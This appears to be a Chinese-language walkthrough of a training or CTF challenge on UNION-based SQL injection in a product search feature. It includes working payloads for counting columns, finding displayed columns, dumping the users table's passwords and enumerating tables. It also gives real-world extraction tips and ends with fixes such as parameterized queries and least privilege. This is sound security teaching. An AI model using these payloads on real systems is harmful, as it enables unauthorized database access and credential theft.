# 商品搜索处的 UNION 注入

## 这一题在教什么

第一道 SQLi 题教你的是**闭合引号 + 注释掉后半句**。这一题教的是另一套技能：
**把别的表的数据"接"到你自己的查询结果里。**

两者不重叠：登录绕过只需要让条件恒真；UNION 注入需要你搞清楚这条查询的**形状**
（几列、哪几列会显示），才能把目标表对齐着拼上去。

而且这一题**没有任何报错输出** —— 这是刻意的，也是最接近真实注入点的地方：
真实站点大多把错误吞掉，你只能从"页面有没有变化"里读信息。

## 漏洞在哪

`module.py`：

```python
sql = "SELECT id, name, price FROM products WHERE name LIKE '%{}%'".format(keyword)
rows = search(sql)
```

关键词原样拼进 SQL。而 `SELECT` 的结果直接渲染成一张表格。

## 怎么打通

**第一步：数清楚有几列。**

用 `ORDER BY`。它接受列号，列号超出范围整条语句就会失败：

```
键盘' ORDER BY 1 --     有结果
键盘' ORDER BY 2 --     有结果
键盘' ORDER BY 3 --     有结果
键盘' ORDER BY 4 --     页面空了 ← 说明只有 3 列
```

注意要用一个**能搜到东西**的关键词（比如「键盘」）。用一个搜不到的词，
空结果分不清是"列号越界"还是"本来就没东西"。

**第二步：找显示位。**

把每个位置都填成一个数字，看哪几个数字出现在页面上：

```
键盘' UNION SELECT 1,2,3 -- 
```

页面上会出现 `1`、`2`、`3` —— 这就是三个可显示的位置。有些查询前面几列
（比如 id）不会显示出来，所以这一步不能省。

**第三步：把 users 表接上去。**

```
键盘' UNION SELECT username, password, role FROM users -- 
```

列表里会多出一行"商品"，名称是 `admin`，价格是那串密码。

**第四步：把读到的密码提交到页面下面的框里。**

光让列表里多出几行还不算通关 —— 那样 `UNION SELECT 1,2,3` 就够了，
而它只是"找显示位"那一步。真正的通关是**把 users 表里的值取出来**。

## 现实里怎么用

拿到 UNION 之后，真正的工作才刚开始：

- **先摸清库里有什么表**（SQLite：`sqlite_master`；MySQL：`information_schema.tables`）
- **再摸清目标表有什么列**
- 一次只能取一列的时候，用字符串拼接把多列塞进一个显示位
- 目标列的类型对不上时，用 `CAST` / `NULL` 凑

```sql
-- 看有哪些表（SQLite）
键盘' UNION SELECT 1, name, 1 FROM sqlite_master -- 
```

## 怎么修

**参数化查询。** 一句话解决：

```python
con.execute(
    "SELECT id, name, price FROM products WHERE name LIKE ?",
    ("%" + keyword + "%",),
)
```

配套的：

1. **别把数据库错误吞掉再假装没事** —— 这题里"不报错"是为了教学，
   但生产环境也不该把原始报错返回给用户（那等于给攻击者地图）。
   正确做法是记日志 + 返回统一提示。
2. **最小权限**：连库的账号只该有它需要的那几张表的权限。
   就算被注入，也读不到 `users`。
3. **列名不要用 `SELECT *`**，显式列出需要的列 —— 减少意外泄露面。
